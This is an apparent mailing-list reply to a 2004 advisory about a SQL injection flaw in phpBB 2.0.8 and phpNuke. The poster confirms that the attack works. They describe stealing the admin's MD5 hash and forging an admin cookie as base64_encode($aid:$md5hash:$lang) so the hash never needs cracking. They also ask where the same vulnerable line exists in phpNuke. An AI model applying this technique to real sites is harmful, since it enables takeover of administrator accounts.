Subject: Re: [waraxe-2004-SA#013 - Critical sql injection bug in PhpBB 2.0.8
    and in older versions]


The combination of the original post with the couple of follow ups that 
followed were quite effective. Putting the hash in the message instead 
of subject worked to show the whole hash. And I can't recall if it was 
discussed on this thread or not but creating the admin = 
base64_encode($aid:$md5hash:$lang) worked to further successfully push 
the severity considering that if the admin's password were greater than 
9 or 10 characters (assuming no dictionary words and using special 
chars) cracking the stolen md5 hash would not be mathematically 
feasible. So suffice it to say, this works very well. I noticed a patch 
was posted for phpBB (the patch as far as I could tell just changed a ' 
.= ' into a ' = ' correct?). However, this problem also worked on just 
the basic phpnuke. I looked around for privmsg.php within phpnuke, but 
none exists. I assume there is another file within nuke's modules where 
the '$pm_sql_user .=' exists. Already checked all the php files in the 
modules directory of Private_Messages (going off of a 6.0 distro), but 
good ol' kwrite didn't find anything when I searched the files for 
'$pm'. Any ideas? Thanks.
